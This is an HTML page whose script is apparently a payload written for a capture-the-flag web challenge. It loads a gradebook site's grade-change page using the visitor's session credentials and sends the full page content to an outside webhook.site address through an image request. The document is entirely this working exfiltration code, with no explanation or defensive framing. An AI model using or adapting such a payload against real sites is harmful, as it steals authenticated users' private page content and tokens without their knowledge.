<!DOCTYPE html>
<html>
<body>
    <script>
        // Function to send data to webhook via GET request
        function sendToWebhook(data) {
            const params = new URLSearchParams();
            params.append('data', JSON.stringify(data));
            new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
        }

        // Fetch the grade-change page and return entire DOM
        fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
            credentials: 'include'
        })
        .then(response => response.text())
        .then(html => {
            // Send entire HTML to webhook
            sendToWebhook({
                type: 'full_dom',
                html: html,
                message: 'Full DOM of grade-change page'
            });
        })
        .catch(error => {
            // Send error to webhook
            sendToWebhook({
                type: 'fetch_error',
                error: error.toString(),
                message: 'Failed to fetch grade-change page'
            });
        });
    </script>
</body>
</html>
